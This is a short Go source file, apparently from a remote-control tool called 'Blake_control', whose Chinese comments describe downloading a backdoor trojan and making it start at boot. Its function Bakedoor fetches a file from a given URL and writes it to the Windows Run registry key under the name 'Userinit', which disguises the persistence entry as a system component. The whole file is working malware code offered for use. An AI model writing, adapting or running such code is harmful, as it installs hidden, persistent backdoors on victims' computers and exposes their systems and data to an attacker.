package operation

import (
	"Blake_control/mylib"
)

//下载木马文件，并在注册表中添加开机自启
//执行的命令

//url为后门木马的下载地址
//path为后门木马保存到地址
func Bakedoor(url string, path string) {
	mylib.DownloadFile(url, path)
	cmd := "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"  /v \"Userinit\" /t REG_SZ /d \"" + path + "\"" + " /f"
	mylib.Cmdstart(cmd)
}
